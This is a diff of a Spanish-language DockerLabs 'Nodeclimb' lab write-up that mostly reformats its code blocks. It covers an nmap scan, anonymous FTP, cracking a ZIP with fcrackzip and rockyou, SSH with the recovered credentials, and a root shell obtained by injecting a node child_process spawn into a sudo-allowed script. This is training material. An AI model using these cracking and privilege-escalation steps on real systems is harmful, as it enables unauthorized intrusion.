@@ -1,159 +1,122 @@
 # Nodeclimb (DockerLabs) - WriteUp
 
-**Sitio:** DockerLabs
-**Dificultad:** Fácil
-**Fecha:** 12/07/2025
+**Sitio:** DockerLabs  
+**Dificultad:** Fácil  
+**Fecha:** 12/07/2025  
 
-## Aprendizajes
+## Aprendizajes  
 
-* Uso de `fcrackzip` para crêckeo de ZIP protegido.
+* Uso de `fcrackzip` para crackeo de ZIP protegido.  
 * Comprensión de escalada de privilegios cuando `sudo -l` muestra `(ALL) NOPASSWD` apuntando a un binario con un archivo específico, adaptando el payload según corresponda para evitar errores y lograr la escalada correctamente.
 
 ---
 
-## Enumeración
+## Enumeración  
 
-**1)** Escaneo inicial:
+**1)** Escaneo inicial:  
 
-```bash
-sudo nmap -sSV -O --open 172.17.0.2
-```
+`sudo nmap -sSV -O --open 172.17.0.2`  
 
-Puertos abiertos:
+Puertos abiertos:  
 
-```
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
-OS: Linux
-```
+PORT   STATE SERVICE VERSION  
+`21/tcp open  ftp`     vsftpd 3.0.3  
+`22/tcp open  ssh`     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)  
+OS: `Linux`  
+
 
 ---
 
-## Acceso FTP
+## Acceso FTP  
 
-**2)** Conexión FTP con credenciales anónimas:
+**2)** Conexión FTP con credenciales anónimas:  
 
-```bash
-ftp 172.17.0.2
-```
+`ftp 172.17.0.2`  
 
-```
-user: anonymous
-pass: anonymous
-```
+user: `anonymous`  
+pass: `anonymous`  
 
-Se descarga un archivo `secretitopicaron.zip` que pide contraseña al intentar descomprimirlo.
+Se descarga un archivo `secretitopicaron.zip` que pide contraseña al intentar descomprimirlo.  
 
 ---
 
-## Cracking del ZIP con fcrackzip
+## Cracking del ZIP con fcrackzip  
 
-**3)** Se utiliza fuerza bruta:
+**3)** Se utiliza fuerza bruta:  
 
-```bash
-fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u secretitopicaron.zip
-```
+`fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u secretitopicaron.zip`  
 
-**Explicación de flags:**
+**Explicación de flags:**  
 
-* `-D`: Ataque de diccionario.
-* `-p`: Ruta al diccionario.
-* `-u`: Intenta descomprimir con cada password para mostrar salida sólo si es exitosa.
+* `-D`: Ataque de diccionario.  
+* `-p`: Ruta al diccionario.  
+* `-u`: Intenta descomprimir con cada password para mostrar salida sólo si es exitosa.  
 
-> **Contraseña encontrada:** `password1`
+> **Contraseña encontrada:** `password1`  
 
-Se descomprime el ZIP y se obtienen credenciales:
+Se descomprime el ZIP y se obtienen credenciales:  
 
-```
-user: mario
-pass: laKontraseñAmasmalotaHdelbarrioH
-```
+user: `mario`  
+pass: `laKontraseñAmasmalotaHdelbarrioH`  
 
 ---
 
-## Acceso por SSH y enumeración de privilegios
+## Acceso por SSH y enumeración de privilegios  
 
-**4)** Conexión SSH:
+**4)** Conexión SSH:  
 
-```bash
-ssh mario@172.17.0.2
-```
+`ssh mario@172.17.0.2`  
 
-Listar privilegios con:
+Listar privilegios con:  
 
-```bash
-sudo -l
-```
+`sudo -l`  
 
-Salida:
+Salida:  
 
-```
-(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
-```
+`(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js`  
 
-Verificamos permisos del archivo:
+Verificamos permisos del archivo:  
 
-```bash
-ls -la /home/mario/script.js
-```
+`ls -la /home/mario/script.js`  
 
-```
--rw-r--r-- 1 mario mario 0 Jul  5  2024 /home/mario/script.js
-```
+`-rw-r--r-- 1 mario mario 0 Jul  5  2024 /home/mario/script.js`  
 
 ---
 
-## Escalada de privilegios con Node
+## Escalada de privilegios con Node  
 
-En **GTFOBins** figura el siguiente comando para escalada con Node:
+En **GTFOBins** figura el siguiente comando para escalada con Node:  
 
-```bash
-sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
-```
+`sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'`  
 
-**Importante:**
+**Importante:**  
 
-* Si `sudo -l` mostrara `sudo /usr/bin/node`, podrías ejecutar el comando entero.
-* Al mostrar `sudo /usr/bin/node /home/mario/script.js`, indica que el binario apunta a ese .js, por lo que debes modificar el script directamente para inyectar el payload.
+* Si `sudo -l` mostrara `sudo /usr/bin/node`, se podría ejecutar el comando entero.  
+* Al mostrar `sudo /usr/bin/node /home/mario/script.js`, indica que el binario apunta a ese .js, por lo que se debe modificar el script directamente para inyectar el payload. 
 
-**Procedimiento:**
+**Procedimiento:**   
 
-```bash
-nano /home/mario/script.js
-```
+`nano /home/mario/script.js`  
 
-Pegar dentro:
+Pegar dentro:  
 
-```js
-require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
-```
+`require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})`  
 
-Guardar y cerrar.
+Guardar y cerrar.  
 
-Ejecutar con escalada:
+Ejecutar con escalada:  
 
-```bash
-sudo /usr/bin/node /home/mario/script.js
-```
+`sudo /usr/bin/node /home/mario/script.js`  
 
-Confirmar con:
+Confirmar con:  
 
-```bash
-whoami
-```
-
-Salida:
-
-```
-root
-```
+`whoami = root`  
 
 ---
 
 ## Conclusión
 
 * Se logró escalar privilegios a **root** mediante la modificación del archivo `script.js` ejecutado con `node` bajo `NOPASSWD`, adaptando el procedimiento según el tipo de salida de `sudo -l`.
-* Se practicó crêckeo de ZIP protegido con `fcrackzip`, acceso básico por FTP anónimo, enumeración con `nmap` y se reforzó la interpretación de configuraciones de `sudo` en contextos reales de pentesting.
+* Se practicó crackeo de ZIP protegido con `fcrackzip`, acceso básico por FTP anónimo, enumeración con `nmap` y se reforzó la interpretación de configuraciones de `sudo` en contextos reales de pentesting.
 
 
